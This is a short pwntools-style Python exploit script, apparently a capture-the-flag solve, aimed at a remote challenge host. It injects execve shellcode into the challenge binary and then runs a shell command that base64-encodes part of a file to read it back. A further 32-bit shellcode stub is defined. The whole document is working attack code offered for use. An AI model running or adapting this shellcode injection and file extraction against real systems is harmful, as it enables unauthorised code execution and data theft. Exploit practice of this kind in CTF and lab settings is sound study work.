#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit import *
from time import sleep

exe = context.binary = ELF("./chall")
host = args.HOST or "01.linux.challenges.ctf.thefewchosen.com"
port = int(args.PORT or 54654)

gdbscript = """
tbreak main
continue
""".format(
    **locals()
)

libc = SetupLibcELF()

io = start()

sc = """
	push esp
	mov eax, 0x4
	mov ebx, 0x1
	mov ecx, esp
	mov edx, 0x4
	int 0x80
	mov dword ptr [esp], 0xdead
	int 0x80
"""

re()
sl(asm(execve_x32))
sl(b"head -c 100 main | base64")
print(re())
# print(io.recvall())
# print(hd(re()))
# io.interactive()
